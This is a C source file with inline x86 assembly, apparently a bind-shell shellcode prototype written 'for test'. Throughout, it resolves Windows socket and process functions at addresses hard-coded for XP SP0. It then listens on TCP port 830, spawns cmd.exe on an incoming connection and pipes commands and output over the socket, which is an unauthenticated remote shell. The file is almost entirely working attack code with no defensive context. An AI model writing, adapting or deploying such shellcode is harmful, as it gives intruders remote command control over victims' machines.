/*
	bind 830  asm   for test
			by ww0830 
*/

#include <windows.h>
#pragma comment(lib,"Ws2_32")
 
int main()
{
	
	__asm
	{
		push ebp    ;
		mov ebp,esp    ;				
		xor eax,eax   ;
		push eax;
		push eax;
		push eax;
		mov byte ptr [ebp-0bh],57h; 
		mov byte ptr [ebp-0ah],53h;
		mov byte ptr [ebp-09h],32h;
		mov byte ptr [ebp-08h],5Fh;
		mov byte ptr [ebp-07h],33h;
		mov byte ptr [ebp-06h],32h;
		mov byte ptr [ebp-05h],2Eh;
		mov byte ptr [ebp-04h],44h;
		mov byte ptr [ebp-03h],4Ch;
		mov byte ptr [ebp-02h],4Ch;
		lea eax,[ebp-0bh]; 
		push eax    ;
		mov eax,0x71a20000;
		call eax  ; 
	}	
	  __asm
	{
		push ebp;
		sub  esp, 80; 
		mov  ebp,esp;
		//把要用到的函数地址存起来－－以下都是xp sp0
			mov eax,0x7c81d827
			mov [ebp+4],  eax;	CreatePipe
			mov eax,0x7c80236b
			mov  [ebp+8],  eax;	CreateProcessA
			mov eax,0x7c860817
			mov  [ebp+12], eax;	PeekNamedPipe	
			mov eax,0x7c810e17
			mov  [ebp+16], eax;	WriteFile
			mov eax,0x7c801812
			mov  [ebp+20], eax;	ReadFile
			mov eax,0x7c81cafa
			mov  [ebp+24], eax;	ExitProcess
			mov eax,0x71a26a55
			mov  [ebp+28], eax;	WSAStartup
			mov eax,0x71a24211
			mov  [ebp+32], eax;	socket
			mov eax,0x71a24480
			mov  [ebp+36], eax;	bind
			mov eax,0x71a28cd3
			mov  [ebp+40], eax;	listen
			mov eax,0x71a31040
			mov  [ebp+44], eax;	accept
			mov eax,0x71a24c27
			mov  [ebp+48], eax;	send
			mov eax,0x71a2676f
			mov  [ebp+52], eax;	recv
			mov eax,0x0
			mov [ebp+56],0
			mov [ebp+60],0
			mov [ebp+64],0
			mov [ebp+68],0
			mov [ebp+72],0
LWSAStartup:
		; WSAStartup(0x202, DATA) 
			sub esp, 400
			push esp
			push 0x202
			call [ebp + 28]
			
socket:
		;socket(2,1,6)
			push 6
			push 1
			push 2
			call [ebp + 32]
			mov ebx, eax                ; save socket to ebx
			
LBind:
		;bind(listenFD,(sockaddr *)&server,sizeof(server));
			xor edi,edi
			push edi
			push edi
			mov eax,0x3E030002
			push  eax		; port 830  AF_INET
			mov esi, esp
			
			push  0x10			  ; length
			push esi			  ; &server
			push ebx			  ; socket
			call [ebp + 36]		  ; bind
			
LListen:
		;listen(listenFD,2)
			inc edi
			inc edi
			push edi			;2
			push ebx			;socket
			call [ebp + 40]		;listen
			
LAccept:
		;accept(listenFD,(sockaddr *)&server,&iAddrSize)
			push 0x10
			lea edi,[esp]
			push edi
			push esi			;&server
			push ebx			;socket
			call [ebp + 44]		;accept
			mov ebx, eax		;save newsocket to ebx

Createpipe1:
		;CreatePipe(&hReadPipe1,&hWritePipe1,&pipeattr1,0);
			xor edi,edi
			inc edi
			push edi
			xor edi,edi
			push edi
			push 0xc		;pipeattr
			
			mov esi, esp
			push edi		;0
			push esi		;pipeattr1
			lea eax, [ebp+60]	;&hWritePipe1
			push eax
			lea eax, [ebp+56]	;&hReadPipe1
			push eax
			call [ebp+4]

CreatePipe2:
		;CreatePipe(&hReadPipe2,&hWritePipe2,&pipeattr2,0);
			push edi		;0
			push esi		;pipeattr2
			lea eax,[ebp+68]	;hWritePipe2
			push eax
			lea eax, [ebp+64]	;hReadPipe2
			push eax
			call [ebp+4]

CreateProcess:
		;ZeroMemory TARTUPINFO,10h  PROCESS_INFORMATION  44h
			sub esp, 0x80
			lea edi, [esp]
			xor eax, eax
			push  0x80
			pop ecx
			rep stosd	//清空si
		;si.dwFlags
			lea edi,[esp]
			mov eax, 0x0101
			mov [edi+2ch], eax;
		;si.hStdInput = hReadPipe2 ebp+64
			mov eax,[ebp+64]
			mov [edi+38h],eax
		;si.hStdOutput si.hStdError = hWritePipe1 ebp+60
			mov eax,[ebp+60]
			mov [edi+3ch],eax
			mov eax,[ebp+60]
			mov [edi+40h],eax
		;cmd.exe
			mov eax, 0x00646d63	
			mov [edi+64h],eax	;cmd

		;CreateProcess(NULL,cmdLine,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation)
			lea eax, [esp+44h]
			push eax			;&pi
			push edi			;&si
			push ecx			;0
			push ecx			;0
			push ecx			;0
			inc  ecx
			push ecx			;1
			dec  ecx
			push ecx			;0
			push ecx			;0
			lea eax,[edi+64h]	;"cmd"
			push eax
			push ecx			;0
			call [ebp+8]

		
loop1:
		;while1
		
		;PeekNamedPipe(hReadPipe1,Buff,1024,&lBytesRead,0,0);
		sub esp,400h		;
		mov esi,esp			;esi = Buff
		xor ecx, ecx
		push ecx			;0
		push ecx			;0
		lea edi,[ebp+72]	;&lBytesRead
		push edi			
		mov eax,400h
		push eax			;1024
		push esi			;Buff
		mov eax,[ebp+56]			
		push eax			;hReadPipe1
		call [ebp+12]
		
		mov eax,[edi]
		test eax,eax
		jz recv_command
		
send_result:
		;ReadFile(hReadPipe1,Buff,lBytesRead,&lBytesRead,0)
		xor ecx,ecx
		push ecx		;0
		push edi		;&lBytesRead
		push [edi]		;hReadPipe1
		push esi		;Buff
		push [ebp+56]	;hReadPipe1
		call [ebp+20]

		;send(clientFD,Buff,lBytesRead,0)
		xor ecx,ecx
		push ecx		;0
		push [edi]		;lBytesRead
		push esi		;Buff
		push ebx		;clientFD
		call [ebp+48]

		jmp loop1

recv_command:
		;recv(clientFD,Buff,1024,0)
		xor ecx,ecx
		push ecx
		mov eax,400h
		push eax
		push esi
		push ebx
		call [ebp+52]
		//lea ecx,[edi]
		mov [edi],eax

		;WriteFile(hWritePipe2,Buff,lBytesRead,&lBytesRead,0)
		xor ecx,ecx
		push ecx
		push edi
		push [edi]
		push esi
		push [ebp+68]
		call [ebp+16]
		
		jmp loop1
end:
		
	}
	return 0;
}

